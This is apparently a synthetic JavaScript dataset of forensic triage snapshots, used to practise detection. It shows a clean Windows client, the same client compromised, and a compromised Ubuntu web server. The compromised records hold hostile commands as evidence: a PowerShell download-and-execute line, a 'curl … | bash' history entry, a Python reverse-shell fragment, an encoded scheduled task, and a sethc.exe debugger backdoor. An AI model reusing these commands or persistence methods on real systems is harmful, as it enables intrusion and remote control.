const dfirData = [{"ComputerName":"WIN-CLIENT-01","PSComputerName":"WIN-CLIENT-01","Timestamp":"2026-09-09T14:24:10Z","SystemInfo":[{"Property":"OS Version","Value":"Microsoft Windows 11 Pro (10.0.26100)"},{"Property":"Architecture","Value":"64-bit"},{"Property":"Domain","Value":"CORP.LOCAL"},{"Property":"Uptime","Value":"3 days, 4 hours, 12 minutes"},{"Property":"IP Addresses (IPv4)","Value":"10.0.0.21"}],"Processes":[{"ProcessId":4,"Name":"System","Path":"","CommandLine":"","ParentProcessId":0,"CreationDate":"2026-09-09T14:24:10Z","SHA256":"","Signer":"CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US"},{"ProcessId":712,"Name":"svchost.exe","Path":"C:\\Windows\\System32\\svchost.exe","CommandLine":"C:\\Windows\\system32\\svchost.exe -k netsvcs -p","ParentProcessId":648,"CreationDate":"2026-09-09T14:24:10Z","SHA256":"603629cf5af515757799ecd829687cdf4011d36c5e1119e7bb7ecfeb64fa1e85","Signer":"CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US"},{"ProcessId":1044,"Name":"explorer.exe","Path":"C:\\Windows\\explorer.exe","CommandLine":"C:\\Windows\\Explorer.EXE","ParentProcessId":980,"CreationDate":"2026-09-09T14:24:10Z","SHA256":"30de3fb4d1621e63241cf407bc53e8723e8f9cc1cdb7a5ae7432bf7b0f186bf8","Signer":"CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US"},{"ProcessId":2210,"Name":"chrome.exe","Path":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe","CommandLine":"\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"","ParentProcessId":1044,"CreationDate":"2026-09-09T14:24:10Z","SHA256":"82ec82c820ae0383b5bea1a382660762339b9ef220427a2b0847531eea704ae3","Signer":"CN=Google LLC, O=Google LLC, L=Mountain View, S=California, C=US"},{"ProcessId":3312,"Name":"powershell.exe","Path":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\backup.ps1","ParentProcessId":1044,"CreationDate":"2026-09-09T14:24:10Z","SHA256":"84e8df727e869ce1c123c02c93609f3bb32aeab9db2ffc88689465b6ad8c3f76","Signer":"CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US"}],"Services":[{"Name":"Spooler","DisplayName":"Print Spooler","State":"Running","StartMode":"Auto","PathName":"C:\\Windows\\System32\\spoolsv.exe","ProcessId":1520},{"Name":"W32Time","DisplayName":"Windows Time","State":"Running","StartMode":"Manual","PathName":"C:\\Windows\\system32\\svchost.exe -k LocalService","ProcessId":712},{"Name":"WinDefend","DisplayName":"Microsoft Defender Antivirus Service","State":"Running","StartMode":"Auto","PathName":"\"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18\\MsMpEng.exe\"","ProcessId":2440}],"ScheduledTasks":[{"TaskName":"GoogleUpdateTaskMachineCore","TaskPath":"\\","State":"Ready","Author":"Google LLC","Command":"C:\\Program Files\\Google\\Update\\GoogleUpdate.exe","Arguments":"/c","LastRunTime":"2026-09-08T09:00:00Z","NextRunTime":"2026-09-10T09:00:00Z"},{"TaskName":"DailyBackup","TaskPath":"\\CORP\\","State":"Ready","Author":"CORP\\adminuser","Command":"powershell.exe","Arguments":"-File C:\\Scripts\\backup.ps1","LastRunTime":"2026-09-09T02:00:00Z","NextRunTime":"2026-09-10T02:00:00Z"}],"NetworkConnections":[{"LocalAddress":"10.0.0.21","LocalPort":"139","RemoteAddress":"0.0.0.0","RemotePort":"0","State":"Listen","OwningProcess":4,"Protocol":"TCP","ProcessName":"System","ProcessPath":""},{"LocalAddress":"10.0.0.21","LocalPort":"52344","RemoteAddress":"203.0.113.50","RemotePort":"443","State":"Established","OwningProcess":2210,"Protocol":"TCP","ProcessName":"chrome.exe","ProcessPath":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"}],"ArpTable":[{"IPAddress":"10.0.0.1","LinkLayerAddress":"02-00-00-00-00-01","State":"Reachable","InterfaceAlias":"Ethernet"},{"IPAddress":"10.0.0.30","LinkLayerAddress":"02-00-00-00-00-30","State":"Stale","InterfaceAlias":"Ethernet"}],"LocalUsers":[{"Name":"Administrator","Enabled":false,"Description":"Built-in account for administering the computer/domain","LastLogon":""},{"Name":"jsmith","Enabled":true,"Description":"John Smith","LastLogon":"2026-09-09T13:40:00Z"},{"Name":"svc_backup","Enabled":true,"Description":"Backup service account","LastLogon":"2026-09-09T02:00:00Z"}],"PrivilegedAccess":[{"Group":"Administrators","Name":"CORP\\Domain Admins","ObjectClass":"Group","PrincipalSource":"ActiveDirectory"},{"Group":"Administrators","Name":"WIN-CLIENT-01\\adminuser","ObjectClass":"User","PrincipalSource":"Local"}],"SystemPersistence":[{"Key":"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run","ValueName":"SecurityHealth","Data":"C:\\Windows\\System32\\SecurityHealthSystray.exe","Source":"Registry"},{"Key":"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run","ValueName":"OneDrive","Data":"C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe /background","Source":"Registry"}],"StartupFiles":[{"Path":"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Teams.lnk","CreationTime":"2026-08-01T10:00:00Z","LastWriteTime":"2026-08-01T10:00:00Z","Length":1284,"SHA256":"2a9b54a95ec32da3c71895d283e8f58c3efb429fede574dee0af6c8f9159275b","Signer":"Invalid/NotSigned"}],"ExecutionEvidence":[{"Executable":"CHROME.EXE","FileName":"CHROME.EXE-A1B2C3D4.pf","CreationTime":"2026-09-01T08:00:00Z","LastWriteTime":"2026-09-09T13:41:00Z","Length":123456,"RunCount":88,"Source":"Windows Prefetch"},{"Executable":"POWERSHELL.EXE","FileName":"POWERSHELL.EXE-1122AABB.pf","CreationTime":"2026-09-02T09:00:00Z","LastWriteTime":"2026-09-09T02:00:05Z","Length":98765,"RunCount":14,"Source":"Windows Prefetch"},{"Executable":"Get-Process | Sort CPU -Descending","FileName":"C:\\Users\\jsmith\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt","CreationTime":null,"LastWriteTime":"2026-09-09T13:00:00Z","Length":null,"RunCount":1,"Source":"PowerShell History","User":"jsmith"}],"EventLogs":[{"EventTime":"2026-09-09T13:40:12Z","EventId":4624,"EventName":"Successful Logon","Provider":"Microsoft-Windows-Security-Auditing","TargetUserName":"jsmith","LogonType":"2","IpAddress":"-","Details":"Target: jsmith | LogonType: 2 | IP: -"},{"EventTime":"2026-09-09T02:00:01Z","EventId":4688,"EventName":"Process Creation","Provider":"Microsoft-Windows-Security-Auditing","NewProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ParentProcessName":"C:\\Windows\\System32\\taskeng.exe","CommandLine":"powershell.exe -File C:\\Scripts\\backup.ps1","SubjectUserName":"svc_backup","Details":"Process: powershell.exe | CmdLine: -File C:\\Scripts\\backup.ps1 | Parent: taskeng.exe"}],"InstalledSoftware":[{"DisplayName":"Google Chrome","DisplayVersion":"140.0.7300.0","Publisher":"Google LLC","InstallDate":"20260801","InstallLocation":"C:\\Program Files\\Google\\Chrome"},{"DisplayName":"7-Zip 24.09","DisplayVersion":"24.09","Publisher":"Igor Pavlov","InstallDate":"20260715","InstallLocation":"C:\\Program Files\\7-Zip"},{"DisplayName":"Microsoft 365 Apps for enterprise","DisplayVersion":"16.0.17928.20114","Publisher":"Microsoft Corporation","InstallDate":"20260620","InstallLocation":""}],"FirewallRules":[{"DisplayName":"Core Networking - DNS (UDP-Out)","Enabled":"Yes","Direction":"Out","Profile":"Any","LocalIP":"Any","RemoteIP":"Any","Protocol":"UDP","LocalPort":"Any","RemotePort":"53","Action":"Allow"},{"DisplayName":"Remote Desktop - User Mode (TCP-In)","Enabled":"Yes","Direction":"In","Profile":"Domain","LocalIP":"Any","RemoteIP":"Any","Protocol":"TCP","LocalPort":"3389","RemotePort":"Any","Action":"Allow"}],"RDPConnections":[{"TimeCreated":"2026-09-08T15:20:00Z","Type":"Inbound (EventID 21)","User":"CORP\\adminuser","SourceIP":"10.0.0.44","Destination":"WIN-CLIENT-01","Source":"TerminalServices-LocalSessionManager"}],"DNSCache":[{"Entry":"www.google.com","Name":"www.google.com","Type":"A","Status":"Success","Data":"203.0.113.50","TimeToLive":"120"},{"Entry":"corp.local","Name":"dc01.corp.local","Type":"A","Status":"Success","Data":"10.0.0.10","TimeToLive":"3600"}],"SMBShares":[{"Name":"C$","ScopeName":"*","Path":"C:\\","Description":"Default share"},{"Name":"Backups","ScopeName":"*","Path":"D:\\Backups","Description":"Nightly backups"}],"LoggedinUsers":[{"User":"jsmith","Session":"console","ID":"1","State":"Active","IdleTime":".","LogonTime":"2026-09-09T13:40:00Z"}],"RecycleBin":[{"UserSID":"S-1-5-21-1111111111-2222222222-3333333333-1001","OriginalPath":"C:\\Users\\jsmith\\Documents\\old_report.docx","DeletionTime":"2026-09-07T16:10:00Z","Size":45210,"InfoFile":"$IABCDEF.docx"}],"Drivers":[{"Name":"tcpip","DisplayName":"TCP/IP Protocol Driver","State":"Running","StartMode":"Boot","PathName":"C:\\WINDOWS\\System32\\drivers\\tcpip.sys","Signed":"Signed","Signer":"CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US","SHA256":"ab96be0e94a81a3fcb004439e5ce1d0d4adf75280a0453fc0bb3b922287499c0"},{"Name":"vmusbmouse","DisplayName":"Virtual USB Mouse","State":"Running","StartMode":"Manual","PathName":"C:\\WINDOWS\\System32\\drivers\\vmusbmouse.sys","Signed":"Signed","Signer":"CN=VMware, Inc.","SHA256":"133c99f298b3277fbb3eb8519190acdbce54f4f63700091542ceb1395d7e3366"}],"DefenderSecurity":[{"Type":"RealTimeProtectionEnabled","Value":"True","Source":"Defender Status"},{"Type":"IsTamperProtected","Value":"True","Source":"Defender Status"},{"Type":"Path","Value":"C:\\Program Files\\CorpApp","Source":"Defender Exclusions"}],"DockerContainers":[],"USBHistory":[{"FriendlyName":"SanDisk Cruzer USB Device","Serial":"4C530000000000000000","FirstConnect":"2026-08-15T11:00:00Z"}],"SMBSessions":[]},{"ComputerName":"WIN-CLIENT-01","PSComputerName":"WIN-CLIENT-01","Timestamp":"2026-09-09T14:34:57Z","SystemInfo":[{"Property":"OS Version","Value":"Microsoft Windows 11 Pro (10.0.26100)"},{"Property":"Architecture","Value":"64-bit"},{"Property":"Domain","Value":"CORP.LOCAL"},{"Property":"Uptime","Value":"3 days, 4 hours, 12 minutes"},{"Property":"IP Addresses (IPv4)","Value":"10.0.0.21"}],"Processes":[{"ProcessId":4,"Name":"System","Path":"","CommandLine":"","ParentProcessId":0,"CreationDate":"2026-09-09T14:34:57Z","SHA256":"","Signer":"CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US"},{"ProcessId":712,"Name":"svchost.exe","Path":"C:\\Windows\\System32\\svchost.exe","CommandLine":"C:\\Windows\\system32\\svchost.exe -k netsvcs -p","ParentProcessId":648,"CreationDate":"2026-09-09T14:34:57Z","SHA256":"603629cf5af515757799ecd829687cdf4011d36c5e1119e7bb7ecfeb64fa1e85","Signer":"CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US"},{"ProcessId":1044,"Name":"explorer.exe","Path":"C:\\Windows\\explorer.exe","CommandLine":"C:\\Windows\\Explorer.EXE","ParentProcessId":980,"CreationDate":"2026-09-09T14:34:57Z","SHA256":"30de3fb4d1621e63241cf407bc53e8723e8f9cc1cdb7a5ae7432bf7b0f186bf8","Signer":"CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US"},{"ProcessId":2210,"Name":"chrome.exe","Path":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe","CommandLine":"\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"","ParentProcessId":1044,"CreationDate":"2026-09-09T14:34:57Z","SHA256":"82ec82c820ae0383b5bea1a382660762339b9ef220427a2b0847531eea704ae3","Signer":"CN=Google LLC, O=Google LLC, L=Mountain View, S=California, C=US"},{"ProcessId":3312,"Name":"powershell.exe","Path":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\backup.ps1","ParentProcessId":1044,"CreationDate":"2026-09-09T14:34:57Z","SHA256":"84e8df727e869ce1c123c02c93609f3bb32aeab9db2ffc88689465b6ad8c3f76","Signer":"CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US"},{"ProcessId":6644,"Name":"svch0st.exe","Path":"C:\\Users\\Public\\svch0st.exe","CommandLine":"C:\\Users\\Public\\svch0st.exe -k beacon","ParentProcessId":3312,"CreationDate":"2026-09-09T14:34:57Z","SHA256":"95816bf27b6965feca2efa85813e65852b196b23fd61e9d50cabc3a91d2de761","Signer":"Invalid/NotSigned","Origin":"http://203.0.113.66/update.exe","DownloadZone":"3"}],"Services":[{"Name":"Spooler","DisplayName":"Print Spooler","State":"Running","StartMode":"Auto","PathName":"C:\\Windows\\System32\\spoolsv.exe","ProcessId":1520},{"Name":"W32Time","DisplayName":"Windows Time","State":"Running","StartMode":"Manual","PathName":"C:\\Windows\\system32\\svchost.exe -k LocalService","ProcessId":712},{"Name":"WinDefend","DisplayName":"Microsoft Defender Antivirus Service","State":"Running","StartMode":"Auto","PathName":"\"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18\\MsMpEng.exe\"","ProcessId":2440}],"ScheduledTasks":[{"TaskName":"GoogleUpdateTaskMachineCore","TaskPath":"\\","State":"Ready","Author":"Google LLC","Command":"C:\\Program Files\\Google\\Update\\GoogleUpdate.exe","Arguments":"/c","LastRunTime":"2026-09-08T09:00:00Z","NextRunTime":"2026-09-10T09:00:00Z"},{"TaskName":"DailyBackup","TaskPath":"\\CORP\\","State":"Ready","Author":"CORP\\adminuser","Command":"powershell.exe","Arguments":"-File C:\\Scripts\\backup.ps1","LastRunTime":"2026-09-09T02:00:00Z","NextRunTime":"2026-09-10T02:00:00Z"},{"TaskName":"SystemUpdater","TaskPath":"\\","State":"Ready","Author":"","Command":"powershell.exe","Arguments":"-enc SQBFAFgAKABuAGUAdwAtAG8AYgBqAC4A","LastRunTime":"2026-09-09T14:30:00Z","NextRunTime":"2026-09-09T15:30:00Z"}],"NetworkConnections":[{"LocalAddress":"10.0.0.21","LocalPort":"139","RemoteAddress":"0.0.0.0","RemotePort":"0","State":"Listen","OwningProcess":4,"Protocol":"TCP","ProcessName":"System","ProcessPath":""},{"LocalAddress":"10.0.0.21","LocalPort":"52344","RemoteAddress":"203.0.113.50","RemotePort":"443","State":"Established","OwningProcess":2210,"Protocol":"TCP","ProcessName":"chrome.exe","ProcessPath":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"},{"LocalAddress":"10.0.0.21","LocalPort":"49510","RemoteAddress":"198.51.100.23","RemotePort":"8443","State":"Established","OwningProcess":6644,"Protocol":"TCP","ProcessName":"svch0st.exe","ProcessPath":"C:\\Users\\Public\\svch0st.exe"}],"ArpTable":[{"IPAddress":"10.0.0.1","LinkLayerAddress":"02-00-00-00-00-01","State":"Reachable","InterfaceAlias":"Ethernet"},{"IPAddress":"10.0.0.30","LinkLayerAddress":"02-00-00-00-00-30","State":"Stale","InterfaceAlias":"Ethernet"}],"LocalUsers":[{"Name":"Administrator","Enabled":false,"Description":"Built-in account for administering the computer/domain","LastLogon":""},{"Name":"jsmith","Enabled":true,"Description":"John Smith","LastLogon":"2026-09-09T13:40:00Z"},{"Name":"svc_backup","Enabled":true,"Description":"Backup service account","LastLogon":"2026-09-09T02:00:00Z"}],"PrivilegedAccess":[{"Group":"Administrators","Name":"CORP\\Domain Admins","ObjectClass":"Group","PrincipalSource":"ActiveDirectory"},{"Group":"Administrators","Name":"WIN-CLIENT-01\\adminuser","ObjectClass":"User","PrincipalSource":"Local"}],"SystemPersistence":[{"Key":"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run","ValueName":"SecurityHealth","Data":"C:\\Windows\\System32\\SecurityHealthSystray.exe","Source":"Registry"},{"Key":"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run","ValueName":"OneDrive","Data":"C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe /background","Source":"Registry"},{"Key":"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run","ValueName":"Updater","Data":"C:\\Users\\Public\\svch0st.exe","Source":"Registry"},{"Key":"sethc.exe","ValueName":"Debugger","Data":"C:\\Windows\\System32\\cmd.exe","Source":"IFEO Debugger"}],"StartupFiles":[{"Path":"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Teams.lnk","CreationTime":"2026-08-01T10:00:00Z","LastWriteTime":"2026-08-01T10:00:00Z","Length":1284,"SHA256":"2a9b54a95ec32da3c71895d283e8f58c3efb429fede574dee0af6c8f9159275b","Signer":"Invalid/NotSigned"}],"ExecutionEvidence":[{"Executable":"CHROME.EXE","FileName":"CHROME.EXE-A1B2C3D4.pf","CreationTime":"2026-09-01T08:00:00Z","LastWriteTime":"2026-09-09T13:41:00Z","Length":123456,"RunCount":88,"Source":"Windows Prefetch"},{"Executable":"POWERSHELL.EXE","FileName":"POWERSHELL.EXE-1122AABB.pf","CreationTime":"2026-09-02T09:00:00Z","LastWriteTime":"2026-09-09T02:00:05Z","Length":98765,"RunCount":14,"Source":"Windows Prefetch"},{"Executable":"Get-Process | Sort CPU -Descending","FileName":"C:\\Users\\jsmith\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt","CreationTime":null,"LastWriteTime":"2026-09-09T13:00:00Z","Length":null,"RunCount":1,"Source":"PowerShell History","User":"jsmith"}],"EventLogs":[{"EventTime":"2026-09-09T13:40:12Z","EventId":4624,"EventName":"Successful Logon","Provider":"Microsoft-Windows-Security-Auditing","TargetUserName":"jsmith","LogonType":"2","IpAddress":"-","Details":"Target: jsmith | LogonType: 2 | IP: -"},{"EventTime":"2026-09-09T02:00:01Z","EventId":4688,"EventName":"Process Creation","Provider":"Microsoft-Windows-Security-Auditing","NewProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ParentProcessName":"C:\\Windows\\System32\\taskeng.exe","CommandLine":"powershell.exe -File C:\\Scripts\\backup.ps1","SubjectUserName":"svc_backup","Details":"Process: powershell.exe | CmdLine: -File C:\\Scripts\\backup.ps1 | Parent: taskeng.exe"},{"EventTime":"2026-09-09T14:28:00Z","EventId":4625,"EventName":"Failed Logon","Provider":"Microsoft-Windows-Security-Auditing","TargetUserName":"administrator","LogonType":"3","IpAddress":"198.51.100.23","SubStatus":"0xC000006A","Details":"Target: administrator | LogonType: 3 | IP: 198.51.100.23"},{"EventTime":"2026-09-09T14:29:10Z","EventId":4104,"EventName":"PowerShell Script Block Logging","Provider":"Microsoft-Windows-PowerShell","ScriptBlockText":"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.66/a.ps1')","Path":"","ContextInfo":"","Details":"Path:  | Content: IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.66/a.ps1')"}],"InstalledSoftware":[{"DisplayName":"Google Chrome","DisplayVersion":"140.0.7300.0","Publisher":"Google LLC","InstallDate":"20260801","InstallLocation":"C:\\Program Files\\Google\\Chrome"},{"DisplayName":"7-Zip 24.09","DisplayVersion":"24.09","Publisher":"Igor Pavlov","InstallDate":"20260715","InstallLocation":"C:\\Program Files\\7-Zip"},{"DisplayName":"Microsoft 365 Apps for enterprise","DisplayVersion":"16.0.17928.20114","Publisher":"Microsoft Corporation","InstallDate":"20260620","InstallLocation":""}],"FirewallRules":[{"DisplayName":"Core Networking - DNS (UDP-Out)","Enabled":"Yes","Direction":"Out","Profile":"Any","LocalIP":"Any","RemoteIP":"Any","Protocol":"UDP","LocalPort":"Any","RemotePort":"53","Action":"Allow"},{"DisplayName":"Remote Desktop - User Mode (TCP-In)","Enabled":"Yes","Direction":"In","Profile":"Domain","LocalIP":"Any","RemoteIP":"Any","Protocol":"TCP","LocalPort":"3389","RemotePort":"Any","Action":"Allow"}],"RDPConnections":[{"TimeCreated":"2026-09-08T15:20:00Z","Type":"Inbound (EventID 21)","User":"CORP\\adminuser","SourceIP":"10.0.0.44","Destination":"WIN-CLIENT-01","Source":"TerminalServices-LocalSessionManager"}],"DNSCache":[{"Entry":"www.google.com","Name":"www.google.com","Type":"A","Status":"Success","Data":"203.0.113.50","TimeToLive":"120"},{"Entry":"corp.local","Name":"dc01.corp.local","Type":"A","Status":"Success","Data":"10.0.0.10","TimeToLive":"3600"}],"SMBShares":[{"Name":"C$","ScopeName":"*","Path":"C:\\","Description":"Default share"},{"Name":"Backups","ScopeName":"*","Path":"D:\\Backups","Description":"Nightly backups"}],"LoggedinUsers":[{"User":"jsmith","Session":"console","ID":"1","State":"Active","IdleTime":".","LogonTime":"2026-09-09T13:40:00Z"}],"RecycleBin":[{"UserSID":"S-1-5-21-1111111111-2222222222-3333333333-1001","OriginalPath":"C:\\Users\\jsmith\\Documents\\old_report.docx","DeletionTime":"2026-09-07T16:10:00Z","Size":45210,"InfoFile":"$IABCDEF.docx"}],"Drivers":[{"Name":"tcpip","DisplayName":"TCP/IP Protocol Driver","State":"Running","StartMode":"Boot","PathName":"C:\\WINDOWS\\System32\\drivers\\tcpip.sys","Signed":"Signed","Signer":"CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US","SHA256":"ab96be0e94a81a3fcb004439e5ce1d0d4adf75280a0453fc0bb3b922287499c0"},{"Name":"vmusbmouse","DisplayName":"Virtual USB Mouse","State":"Running","StartMode":"Manual","PathName":"C:\\WINDOWS\\System32\\drivers\\vmusbmouse.sys","Signed":"Signed","Signer":"CN=VMware, Inc.","SHA256":"133c99f298b3277fbb3eb8519190acdbce54f4f63700091542ceb1395d7e3366"},{"Name":"winring0","DisplayName":"WinRing0 Driver","State":"Running","StartMode":"Manual","PathName":"C:\\Users\\Public\\winring0x64.sys","Signed":"Unverified","Signer":"Invalid/NotSigned","SHA256":"0b2f8d9efca5d30aac8f0cd4d9854c2c38a3fad761d82937c08774adafbf3103"}],"DefenderSecurity":[{"Type":"RealTimeProtectionEnabled","Value":"True","Source":"Defender Status"},{"Type":"IsTamperProtected","Value":"True","Source":"Defender Status"},{"Type":"Path","Value":"C:\\Program Files\\CorpApp","Source":"Defender Exclusions"},{"Type":"Path","Value":"C:\\Users\\Public","Source":"Defender Exclusions"}],"DockerContainers":[],"USBHistory":[{"FriendlyName":"SanDisk Cruzer USB Device","Serial":"4C530000000000000000","FirstConnect":"2026-08-15T11:00:00Z"}],"SMBSessions":[]},{"ComputerName":"ubuntu-web-01","PSComputerName":"ubuntu-web-01","Timestamp":"2026-09-09T14:26:58Z","SystemInfo":[{"Property":"Kernel","Value":"Linux ubuntu-web-01 6.8.0-40-generic #40-Ubuntu SMP x86_64 GNU/Linux"},{"Property":"OS Version","Value":"Ubuntu 24.04.1 LTS"},{"Property":"Uptime","Value":"up 5 days, 2 hours"},{"Property":"IP Addresses (IPv4)","Value":"10.0.0.55/24"},{"Property":"DNS Configuration","Value":"nameserver 10.0.0.10"}],"Processes":[{"Id":"1","ParentProcessId":"0","UserName":"root","StartTime":"Sep05","CommandLine":"/sbin/init","Name":"init","Path":"/usr/lib/systemd/systemd","SHA256":"f693b20f79c083632868e202cc9b2fd55e1742d3a57d6ebffda0b5cde15d6c8a","Signer":"N/A"},{"Id":"842","ParentProcessId":"1","UserName":"root","StartTime":"Sep05","CommandLine":"/usr/sbin/sshd -D","Name":"sshd","Path":"/usr/sbin/sshd","SHA256":"4fc37da964c5a59acf25891b9dd185c4183bc980637cb19987a90358be2f53f5","Signer":"N/A"},{"Id":"1190","ParentProcessId":"1","UserName":"www-data","StartTime":"Sep05","CommandLine":"nginx: worker process","Name":"nginx","Path":"/usr/sbin/nginx","SHA256":"118e30ee1985c407d432f2276c73de1f2957303a2dea21df488c948ddf5fd0d6","Signer":"N/A"},{"Id":"4455","ParentProcessId":"842","UserName":"deploy","StartTime":"09:12","CommandLine":"python3 -c import socket,subprocess,os;s=socket.socket()","Name":"python3","Path":"/usr/bin/python3.12","SHA256":"00cdaba812daa2ae4147cd7776e1b7acbc8753d832babf1a2a6966b2622ef03f","Signer":"N/A"}],"Services":[{"Name":"ssh.service","DisplayName":"OpenBSD Secure Shell server","State":"active","SubState":"running","StartMode":"loaded"},{"Name":"nginx.service","DisplayName":"A high performance web server","State":"active","SubState":"running","StartMode":"loaded"},{"Name":"cron.service","DisplayName":"Regular background program processing daemon","State":"active","SubState":"running","StartMode":"loaded"}],"ScheduledTasks":[{"TaskName":"certbot","Schedule":"0 */12 * * *","User":"root","Command":"/usr/bin/certbot renew --quiet","State":"Enabled","Source":"System Crontab"},{"TaskName":"backup.sh","Schedule":"@reboot","User":"deploy","Command":"/home/deploy/backup.sh","State":"Enabled","Source":"Crontab (deploy)"}],"NetworkConnections":[{"LocalAddress":"0.0.0.0","LocalPort":"22","RemoteAddress":"*","RemotePort":"*","State":"LISTEN","Protocol":"TCP","OwningProcess":"842","ProcessName":"sshd","ProcessPath":"/usr/sbin/sshd"},{"LocalAddress":"10.0.0.55","LocalPort":"49022","RemoteAddress":"198.51.100.23","RemotePort":"4444","State":"ESTAB","Protocol":"TCP","OwningProcess":"4455","ProcessName":"python3","ProcessPath":"/usr/bin/python3.12"}],"ArpTable":[{"IPAddress":"10.0.0.1","LinkLayerAddress":"02:00:00:00:00:01","State":"REACHABLE","InterfaceAlias":"eth0"}],"LocalUsers":[{"Username":"root","UID":"0","GID":"0","HomeDirectory":"/root","Shell":"/bin/bash"},{"Username":"www-data","UID":"33","GID":"33","HomeDirectory":"/var/www","Shell":"/usr/sbin/nologin"},{"Username":"deploy","UID":"1001","GID":"1001","HomeDirectory":"/home/deploy","Shell":"/bin/bash"},{"Username":"analyst","UID":"1000","GID":"1000","HomeDirectory":"/home/analyst","Shell":"/bin/bash"}],"PrivilegedAccess":[{"Group":"sudo","Name":"analyst","ObjectClass":"User","PrincipalSource":"LocalGroup"},{"Group":"sudoers_file","Name":"deploy","ObjectClass":"Configuration","PrincipalSource":"ALL=(ALL) NOPASSWD: ALL"}],"SystemPersistence":[{"KeyName":"/etc/rc.local","ValueData":"File exists, size: 412 bytes"},{"KeyName":"~/.ssh/authorized_keys","ValueData":"File exists, size: 742 bytes"},{"KeyName":"Kernel Module: nf_tables","ValueData":"nf_tables 274432 1"}],"StartupFiles":[{"Path":"/etc/init.d/nginx","CreationTime":"Tue Sep  3 10:00:00 2026","LastWriteTime":"Tue Sep  3 10:00:00 2026","Length":2456,"SHA256":"104f832fe434b911bd722f133db341b325f03c53dd11bb491564dbd7db738a5b","Signer":"N/A"}],"ExecutionEvidence":[{"Executable":"sudo apt-get update","FileName":"/home/analyst/.bash_history","CreationTime":"","LastWriteTime":"","Length":0},{"Executable":"curl http://203.0.113.66/x.sh | bash","FileName":"/home/deploy/.bash_history","CreationTime":"","LastWriteTime":"","Length":0},{"Executable":"/usr/bin/apt","FileName":"sudo","CreationTime":"2026-09-09T09:05:00Z","LastWriteTime":"2026-09-09T09:05:00Z","Length":0}],"EventLogs":[{"EventTime":"2026-09-09T09:00:01Z","EventId":"Auth","Provider":"Auth","Username":"analyst","Status":"Success","Message":"Accepted publickey for analyst from 10.0.0.44 port 51520 ssh2","Details":"Accepted publickey for analyst from 10.0.0.44 port 51520 ssh2"},{"EventTime":"2026-09-09T09:12:33Z","EventId":"Auth","Provider":"Auth","Username":"root","Status":"Failed","Message":"Failed password for root from 198.51.100.23 port 40122 ssh2","Details":"Failed password for root from 198.51.100.23 port 40122 ssh2"}],"InstalledSoftware":[{"DisplayName":"nginx","DisplayVersion":"1.24.0-2ubuntu7","Publisher":"Ubuntu Developers"},{"DisplayName":"openssh-server","DisplayVersion":"1:9.6p1-3ubuntu13","Publisher":"Ubuntu Developers"},{"DisplayName":"python3","DisplayVersion":"3.12.3-0ubuntu2","Publisher":"Ubuntu Developers"}],"FirewallRules":[{"DisplayName":"[ 1] 22/tcp ALLOW IN Anywhere","Direction":"In/Out","Action":"UFW Rule","Profile":"UFW","Details":"[ 1] 22/tcp ALLOW IN Anywhere"},{"DisplayName":"[ 2] 80,443/tcp ALLOW IN Anywhere","Direction":"In/Out","Action":"UFW Rule","Profile":"UFW","Details":"[ 2] 80,443/tcp ALLOW IN Anywhere"}],"LoggedinUsers":[{"User":"analyst","TTY":"pts/0","From":"10.0.0.44","Idle":"0.00s","Command":"-bash"}],"DNSCache":[{"Entry":"Config","Name":"/etc/resolv.conf","Type":"nameserver","Status":"File","Data":"nameserver 10.0.0.10","TimeToLive":""}],"RecycleBin":[{"User":"analyst","OriginalPath":"/home/analyst/notes.txt","DeletionTime":"2026-09-08T14:00:00Z","InfoFile":"notes.txt.trashinfo"}],"DockerContainers":[],"SMBSessions":[],"SMBShares":[],"Drivers":[],"DefenderSecurity":[]}];